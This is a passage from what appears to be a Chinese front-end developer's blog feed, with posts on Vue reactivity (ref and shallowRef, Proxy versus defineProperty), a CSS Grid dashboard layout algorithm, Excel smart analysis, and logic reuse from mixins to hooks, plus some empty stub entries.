class="comment">// 触发更新</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>shallowRef</code><br>shallowRef则是只对.value的变化触发响应，内部值不会被深度响应式处理，适用于大型对象或不需要深度监听的情况。</p><ul><li>需要监听引用替换但不需要深度响应时（如大型数据、第三方类实例）。</li><li>需要手动控制更新粒度时。</li></ul></li></ul><p><br></p><h4 id="2-3-为什么需要-value"><a href="#2-3-为什么需要-value" class="headerlink" title="2.3 为什么需要.value"></a>2.3 为什么需要<code>.value</code></h4><p><br></p><h4 id="2-4-为什么需要toRef"><a href="#2-4-为什么需要toRef" class="headerlink" title="2.4 为什么需要toRef"></a>2.4 为什么需要<code>toRef</code></h4><p><br></p><h4 id="2-5-响应式丢失"><a href="#2-5-响应式丢失" class="headerlink" title="2.5 响应式丢失"></a>2.5 响应式丢失</h4><h4 id="2-6-为什么要用ref"><a href="#2-6-为什么要用ref" class="headerlink" title="2.6 为什么要用ref()"></a>2.6 为什么要用<code>ref()</code></h4><p>Vue 3 的响应式系统本身最大的特点是不仅不依赖编译，而且跟组件上下文无关，甚至跟 Vue 框架其它部分也是解耦的。同一套系统你可以用在 Vue 组件里，组件外，其他框架里，甚至用在后端。</p><p><br></p><h3 id="3-Object-defineProperty-和-Proxy的区别"><a href="#3-Object-defineProperty-和-Proxy的区别" class="headerlink" title="3. Object.defineProperty 和 Proxy的区别"></a>3. Object.defineProperty 和 Proxy的区别</h3><p><em>Proxy</em></p><ul><li>劫持方式：代理整个对象，只需做一层代理就可以监听对象下的所有属性变化，包括新增属性和删除属性、数组变更</li><li>依赖收集时机：</li><li>本质：Proxy 本质上属于元编程非破坏性数据劫持，在原对象的基础上进行了功能的衍生而又不影响原对象</li><li>Proxy 拦截方式更多, Object.defineProperty 只有 get 和 set</li><li>Proxy 兼容性差</li></ul><p><em>Object.defineProperty</em></p><ul><li>劫持方式：只能深度遍历劫持对象的key，无法劫持数组索引下标(0, 1, 2…)</li><li>流程：get中进行依赖收集，set数据时通知订阅者更新</li><li>存在的问题：虽然 Object.defineProperty 通过为属性设置 getter/setter 能够完成数据的响应式，但是它并不算是实现数据的响应式的完美方案，某些情况下需要对其进行修补或者hack，这也是它的缺陷，主要表现在两个方面：<ul><li>无法监听新增加的属性</li><li>无法一次性监听对象所有属性，如对象属性的子属性</li><li>无法响应数组的操作</li></ul></li></ul><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.zhihu.com/question/492260571/answer/2169614031" target="_blank" rel="noopener">为什么 vue3 删不掉 ref() 这样冗余的函数，但 svelte 可以？</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>灵活扩展：Webpack5 的 Module Federation</title>
      <link href="/2025/02/14/%E6%8F%92%E4%BB%B6%E6%9C%BA%E5%88%B6/"/>
      <url>/2025/02/14/%E6%8F%92%E4%BB%B6%E6%9C%BA%E5%88%B6/</url>
      <content type="html"><![CDATA[]]></content>
      
      
    </entry>
    
    <entry>
      <title>SVG实践</title>
      <link href="/2025/02/13/SVG%E5%AE%9E%E8%B7%B5/"/>
      <url>/2025/02/13/SVG%E5%AE%9E%E8%B7%B5/</url>
      <content type="html"><![CDATA[<h3 id="1-svgo"><a href="#1-svgo" class="headerlink" title="1. svgo"></a>1. svgo</h3><p>很多矢量编辑器，或者类似AI这样的矢量软件，导出来的SVG文件都会有很多其他冗余信息。使用<a href="https://github.com/svg/svgo" target="_blank" rel="noopener">svgo</a>可以精简svg元素。<br>在线压缩工具：<a href="https://www.zhangxinxu.com/sp/svgo/" target="_blank" rel="noopener">https://www.zhangxinxu.com/sp/svgo/</a></p><h3 id="2-多个svg之间的补间动画"><a href="#2-多个svg之间的补间动画" class="headerlink" title="2. 多个svg之间的补间动画"></a>2. 多个svg之间的补间动画</h3>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>仿豆包·智能输入框实现</title>
      <link href="/2025/02/13/%E5%A4%8D%E6%9D%82%E8%BE%93%E5%85%A5%E6%A1%86/"/>
      <url>/2025/02/13/%E5%A4%8D%E6%9D%82%E8%BE%93%E5%85%A5%E6%A1%86/</url>
      <content type="html"><![CDATA[<blockquote><p>AI需求</p></blockquote><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.zhangxinxu.com/wordpress/2022/08/gitee-feishu-okr-at-mention/" target="_blank" rel="noopener">gitee上撸了个类似飞书OKR输入框的@提及项目</a></li><li><a href="https://www.doubao.com/" target="_blank" rel="noopener">豆包输入框</a></li><li><a href="https://juejin.cn/post/7433439452662382618?searchId=202502252211221A86262DE00536267AD5" target="_blank" rel="noopener">AI 智能输入框解决方案【前端】</a></li><li><a href="https://www.zhangxinxu.com/wordpress/2024/07/css-custom-highlight-api/" target="_blank" rel="noopener">今日学习CSS文本自定义高亮API</a></li></ul>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>智能分析 - Antv G2 Plot数据可视化</title>
      <link href="/2025/02/11/%E6%99%BA%E8%83%BD%E5%88%86%E6%9E%90-chart/"/>
      <url>/2025/02/11/%E6%99%BA%E8%83%BD%E5%88%86%E6%9E%90-chart/</url>
      <content type="html"><![CDATA[]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>智能分析</title>
      <link href="/2025/02/11/%E6%99%BA%E8%83%BD%E5%88%86%E6%9E%90/"/>
      <url>/2025/02/11/%E6%99%BA%E8%83%BD%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>智能分析是在通用场景下，通过数据清洗、推荐分析方案、快速生成图表的技术能力，<br>使用<em>数学方法</em>为用户提供一键化的数据分析解决方案。</p></blockquote><h3 id="1-传统实现"><a href="#1-传统实现" class="headerlink" title="1. 传统实现"></a>1. 传统实现</h3><p>一个Excel表格，要统计成数据报表，运营人员需要操作这几个步骤：</p><ul><li>筛选数据</li><li>组织数据透视表</li><li>制作表格+图表、总结结论</li><li>整理成报告</li></ul><p>而智能分析利用<em><code>AI + BI</code></em> 可以为用户提供一键化产出数据分析报告的工具。<br><img src="/2025/02/11/智能分析/1.png" style="margin: 10px"><br><br></p><h3 id="2-智能分析"><a href="#2-智能分析" class="headerlink" title="2. 智能分析"></a>2. 智能分析</h3><p>智能分析包含表格结构识别、列类型识别、数据校对、数据清洗、多维数据库建模、根据数据特性选择分析方法、推荐图表类型和结论、数据可视化等多个模块。<br><img src="/2025/02/11/智能分析/2.png"></p><p><br></p><h4 id="2-2-数据清洗"><a href="#2-2-数据清洗" class="headerlink" title="2.2 数据清洗"></a>2.2 数据清洗</h4><p>用户的Excel表格不能直接拿来分析，它们的表头往往复杂、不规范，由多行单元格组成。<br>需要转为方便分析的数据表，让表中的每列均有列名、数据类型、具体数据。</p><ul><li>识别：一个excel sheet里可能会有多个表格，这时需要切表、选择需要分析的表格</li><li>校对：识别列类型、校对不正确的数据，让表中的每列均有列名、数据类型、具体数据</li><li>清洗：删除不需要分析的行、平铺单元格，生成数据表</li></ul><p><em>有了数据表之后，接下来的问题就是，如何生成分析结果？</em><br><br></p><h4 id="2-2-数据挖掘"><a href="#2-2-数据挖掘" class="headerlink" title="2.2 数据挖掘"></a>2.2 数据挖掘</h4><p>数据挖掘是指从数据库的大量数据中揭示出隐含的、先前未知的并有潜在价值的信息的非平凡过程。</p><p>我们想知道的往往是，<em>表格字段之间是否有关系？</em><br>这时可以：</p><ul><li>假设字段之间存在关系</li><li>选择分析方法，进行检验</li><li>得出结论</li></ul><p><em>将这个步骤，转化为数学问题，并用数学方法求解</em></p><ul><li>假设关系</li><li>检验：分析方法转为数学公式，求解结果</li><li>根据求解结果 + 分析方法，得出描述性语句</li></ul><p><br></p><h4 id="2-3-数据可视化"><a href="#2-3-数据可视化" class="headerlink" title="2.3 数据可视化"></a>2.3 数据可视化</h4><p>得到求解结果、描述性语句后，生成图表，进行数据可视化</p><p><img src="/2025/02/11/智能分析/4.png"></p><p><br></p>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>仪表盘绘制方案</title>
      <link href="/2025/02/11/%E6%95%B0%E6%8D%AE%E7%9C%8B%E6%9D%BF/"/>
      <url>/2025/02/11/%E6%95%B0%E6%8D%AE%E7%9C%8B%E6%9D%BF/</url>
      <content type="html"><![CDATA[<blockquote><p>根据Excel数据，一键生成仪表盘。</p></blockquote><p><br></p><h3 id="1-需要解决的问题"><a href="#1-需要解决的问题" class="headerlink" title="1. 需要解决的问题"></a>1. 需要解决的问题</h3><p>仪表盘中的每个图表、卡片都是一个小矩形。需要解决的问题是，如何将不定量、不定大小的小矩形，拼成一个大矩形？<br><img src="/2025/02/11/数据看板/7.png" style="display: inline-block; width: 50%; margin: 14px 0"><img src="/2025/02/11/数据看板/8.png" style="display: inline-block; width: 50%;margin: 14px 0"></p><p><br></p><h4 id="1-1-定义元素"><a href="#1-1-定义元素" class="headerlink" title="1.1 定义元素"></a>1.1 定义元素</h4><p>【Step 1】在拼成仪表盘前，我们先定义图表的size。<br>根据图表的特征类型，图表的size会被标记成rect1, rect2, rect3，具体宽高如下图所示。<br><img src="/2025/02/11/数据看板/1.png" style="margin: 10px auto 20px"></p><p><br></p><h4 id="1-2-拆分子任务"><a href="#1-2-拆分子任务" class="headerlink" title="1.2 拆分子任务"></a>1.2 拆分子任务</h4><p>【Step 2】将“拼成大矩形“的任务，拆分成“拼成一行“的子任务。<br>有的仪表盘一行可以放2个元素，有的一行则可以放3个元素，甚至4个。根据一行可以放几个元素，我们列出4种布局：</p><ul><li>一列布局: 总宽350px</li><li>两列布局: 总宽700px</li><li>三列布局: 总宽900px</li><li>四列布局: 总宽1200px<br>如下图所示，在两列布局中,rect2可以单独拼成一行，rect1 + rect1也可以单独拼成一行。下图是可以拼成一行的情况的所有情况，也就是仪表盘的排列布局。<br><img src="/2025/02/11/数据看板/2.png" style="margin: 10px "><br>（PS：这里会将一行当成一个grid-container，而不是整个矩形当成一个grid-container。优点：不同行的之间的最小单元格不必一样）<br>第一步我们已经得到chartSize，假设现在有3个图表，size分别为 rect2, rect1, rect1的小矩形，套入2列布局，依次看能不能拼成一行一行。发现rect2可以拼成一行，rect1 + rect1可以拼成一行，且拼完之后没有其他元素，即可以拼成大矩形。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chartSize = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"><span class="keyword">const</span> PUZZLE_RULE = &#123;</span><br><span class="line">  <span class="number">2</span>: [<span class="string">'11'</span>, <span class="string">'2'</span>, <span class="string">'311'</span>],</span><br><span class="line">  <span class="number">3</span>: [<span class="string">'322'</span>, <span class="string">'3211'</span>, <span class="string">'31111'</span>, <span class="string">'21'</span>, <span class="string">'111'</span>],</span><br><span class="line">  <span class="number">4</span>: <span class="comment">// ...,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-3-确定最终任务"><a href="#1-3-确定最终任务" class="headerlink" title="1.3 确定最终任务"></a>1.3 确定最终任务</h4><p>【Step 3】确保可以拼成矩形<br>但是，因为图表数量、大小是不确定的，将它们套入x列布局中，很大概率不能拼成一个矩形。<br>有两个原因：</p><ul><li>面积不对<br>要在2列布局拼成矩形， 图表总面积必须为2的倍数。<br>假设有3个rect1图表，总面积为3，3 % 2 = 1，即无法拼成</li><li>图表顺序不对<br>七巧板一定要用正确的摆放顺序，才能拼成矩形</li></ul><p><br></p><p><em>为了确保可以拼成矩形，我们可以</em></p><ul><li>改变面积：人为增大图表面积（拉宽拉高）<br>假设x为总面积，要保证<em><code>x % 2 == 0</code></em> &amp;&amp; <em><code>x % 3 == 0</code></em> &amp;&amp; <em><code>x % 4 == 0</code></em>，已知<em><code>x % 2, x % 3 ,x % 4</code></em>可能出现的余数是0,1,2,3。只要把余数补齐，原来不能被2,3,4整除的x，就可以被整除。<br>即将<em><code>y = x || x+1 || x+2 || x+3</code></em>, y总会有一个数能整除2, 整除3, 整除4。因此增大图表面积，能确保1,2,3,4列布局都有一个可以拼成的组合。</li></ul><table><thead><tr><th>套用布局</th><th style="text-align:center">两列布局</th><th style="text-align:right">三列布局</th><th style="text-align:right">四列布局 </th></tr></thead><tbody><tr><td>x(图表总面积 x &gt;=2 )</td><td style="text-align:center">x%2</td><td style="text-align:right">x%3</td><td style="text-align:right">x%4 </td></tr><tr><td>可能得余数</td><td style="text-align:center">0,1</td><td style="text-align:right">0,1,2</td><td style="text-align:right">0,1,2,3</td></tr><tr><td>增加面积对策</td><td style="text-align:center"><em><code>x+1</code></em></td><td style="text-align:right"><em><code>x+1, x+2</code></em></td><td style="text-align:right"><em><code>x+1, x+2, x+3</code></em></td></tr></tbody></table><p><br></p><p><em>求全排列</em><br>穷举所有排列，检查是否符合拼成大矩形，只要符合就停止查找。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设一共有3个图表，大小分别是rect-1, rect-2, rect-1</span></span><br><span class="line"><span class="keyword">const</span> chartSize = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全排列</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">[<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 假设是二列布局</span></span><br><span class="line"><span class="comment"> * 1,1 可以是一行</span></span><br><span class="line"><span class="comment"> * 2 可以是一行</span></span><br><span class="line"><span class="comment"> * 满足条件，输出 [1,1,2]</span></span><br><span class="line"><span class="comment"> * /</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-4-生成css"><a href="#1-4-生成css" class="headerlink" title="1.4 生成css"></a>1.4 生成css</h4><p>【Step 4】 生成css样式<br>找到了拼成的结果，我们知道是几列布局，每一行有哪些图表，每个图表的size。<br>根据CSS Grid 布局，将网页划分成网格，指定元素横跨多个网格、竖跨几个网格，就可以在页面上绘制出仪表盘了。<br><img src="/2025/02/11/数据看板/3.png" style="display: inline-block; height:300px"><img src="/2025/02/11/数据看板/4.png" style="display: inline-block; height:300px"><img src="/2025/02/11/数据看板/5.png" style="display: inline-block; height:300px"><img src="/2025/02/11/数据看板/6.png" style="display: inline-block; height:300px"></p><h3 id="2-代码"><a href="#2-代码" class="headerlink" title="2. 代码"></a>2. 代码</h3><p>😂离职的时候忘记拷这份代码了hhh，其实就是一个求全排列的算法题</p>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>逻辑复用范式 - 从 mixin、高阶组件到 Hooks</title>
      <link href="/2025/02/05/Vue-%E9%80%BB%E8%BE%91%E5%A4%8D%E7%94%A8/"/>
      <url>/2025/02/05/Vue-%E9%80%BB%E8%BE%91%E5%A4%8D%E7%94%A8/</url>
      <content type="html"><![CDATA[<blockquote><p>本文记录《B站·跟尤雨溪一起解读Vue3源码》中，尤雨溪对于逻辑复用演化过程的讲解</p></blockquote><p>假设我们有这么一个组件，在页面上显示<code>[x, y]</code>坐标, <code>[x, y]</code>会随着鼠标移动而变化。代码会是这样的👇🏻</p><p><em>我们想把这段逻辑抽取出来，复用，有什么方法？</em><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> App = &#123;</span><br><span class="line">  template: <span class="string">`&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;`</span>,</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    update(e) &#123;</span><br><span class="line">      <span class="keyword">this</span>.x = e.pageX</span><br><span class="line">      <span class="keyword">this</span>.y = e.pageY</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mouted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="1-mixin"><a href="#1-mixin" class="headerlink" title="1. mixin"></a>1. mixin</h3><p>第一种方法<code>mixin</code>。提取mixin很容易，把数据和逻辑提取出来，放入<code>mixins</code>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> MouseMixin = &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    update(e) &#123;</span><br><span class="line">      <span class="keyword">this</span>.x = e.pageX</span><br><span class="line">      <span class="keyword">this</span>.y = e.pageY</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mouted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = &#123;</span><br><span class="line">  mixins: [MouseMixin],</span><br><span class="line">  template: <span class="string">`&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;`</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但是如果你有很多个mixin，会出现这些问题：</p><ul><li>注入源不明：不知道属性、方法来自哪个mixin</li><li>命名冲突<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> App = &#123;</span><br><span class="line">  mixins: [MouseMixin, mixinA, mixinB, mixnC], <span class="comment">// 存在多个mixin时，会很混乱</span></span><br><span class="line">  template: <span class="string">`&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;`</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-高阶组件"><a href="#2-高阶组件" class="headerlink" title="2. 高阶组件"></a>2. 高阶组件</h3><p>因为mixin的缺点很明显，React在很早的时候就移除了Mixin。<br>但是面对逻辑复用，又没有很好的解决方法，于是提出来了高阶组件。</p><p>高阶组件的用法：</p><p>高阶组件包含了逻辑复用的变量和方法，并包裹住 Inner 组件，同时把<code>x,y</code>作为<code>props</code>传递给 Inner 组件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withMouse</span>(<span class="params">Inner</span>) </span>&#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    update(e) &#123;</span><br><span class="line">      <span class="keyword">this</span>.x = e.pageX</span><br><span class="line">      <span class="keyword">this</span>.y = e.pageY</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mouted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> h(Inner, &#123;</span><br><span class="line">      x: <span class="keyword">this</span>.x, </span><br><span class="line">      y: <span class="keyword">this</span>.y</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = withMouse(&#123;</span><br><span class="line">  props: [<span class="string">'x'</span>, <span class="string">'y'</span>],</span><br><span class="line">  template: <span class="string">`&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;`</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>相比于mixin，高阶组件有了自己的命名空间，不用担心命名冲突的问题。</p><p>但依然不能改变注入源不明的问题。</p><p>假如有多个高阶组件包裹，我们同样无法知道哪个props来自哪个高阶组件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> App = withFoo(withAnother(withMouse(&#123;</span><br><span class="line">  props: [<span class="string">"x"</span>, <span class="string">"y"</span>, <span class="string">"foo"</span>, <span class="string">"bar"</span>]</span><br><span class="line">&#125;)))</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-slot"><a href="#3-slot" class="headerlink" title="3. slot"></a>3. slot</h3><p>在vue中，跟高阶组件相似的是slot。把数据逻辑封装在<code>&lt;Mouse /&gt;</code>中，<code>x, y</code>作为参数传递给slot<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Mouse</span>(<span class="params">Inner</span>) </span>&#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    update(e) &#123;</span><br><span class="line">      <span class="keyword">this</span>.x = e.pageX</span><br><span class="line">      <span class="keyword">this</span>.y = e.pageY</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mouted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted() &#123;</span><br><span class="line">    <span class="built_in">window</span>.removeEventListener(<span class="string">'mousemove'</span>, <span class="keyword">this</span>.update)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// template: `&lt;slot :x="x" :y="y" /&gt;`,</span></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.$slots.default &amp;&amp; <span class="keyword">this</span>.$slots.default(&#123;</span><br><span class="line">      x: <span class="keyword">this</span>.x,</span><br><span class="line">      y: <span class="keyword">this</span>.y</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = &#123;</span><br><span class="line">  template: <span class="string">`&lt;Mouse v-slot="&#123;x, y&#125;"&gt;&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125;&lt;/Mouse&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>&lt;Mouse v-slot=&quot;{x, y}&quot;&gt; &lt;/Mouse&gt;</code>完成了逻辑复用和传递<br>比高阶函数要好的是，我们知道<code>x,y</code>的来源是<code>&lt;Mouse /&gt;</code>。<br>存在多个slot时会是这样的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> App = &#123;</span><br><span class="line">  component: &#123; Mouse, Foo &#125;,</span><br><span class="line">  template: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;Mouse v-slot="&#123; x, y &#125;"&gt;</span></span><br><span class="line"><span class="string">      &lt;Foo v-slot="&#123; foo &#125;"&gt;</span></span><br><span class="line"><span class="string">        &#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125; &#123;&#123; foo &#125;&#125;</span></span><br><span class="line"><span class="string">      &lt;/Foo&gt;</span></span><br><span class="line"><span class="string">    &lt;/Mouse&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>slot看似同时解决了注入源不明、命名冲突的问题。<br>但slot额外产生了组件，增加了性能开销</p><p><br></p><h3 id="4-Hooks"><a href="#4-Hooks" class="headerlink" title="4. Hooks"></a>4. Hooks</h3><p><code>React Class Component</code> 和<code>vue2 option</code>，把<code>data, method</code>都绑定在一起，把它们挪到组件外是一个代价很大的行为。</p><p>意识到高阶组件也不是什么灵丹妙药后，React 提出用 Hooks 彻底取代 Class Component，开启了组件逻辑表达和逻辑复用的新范式，完美解决了上面的问题<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">useMouse</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> x = ref(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">const</span> y = ref(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> update = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    x.value = e.pageX</span><br><span class="line">    y.value = e.pageY</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  onMounted(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, update)</span><br><span class="line">  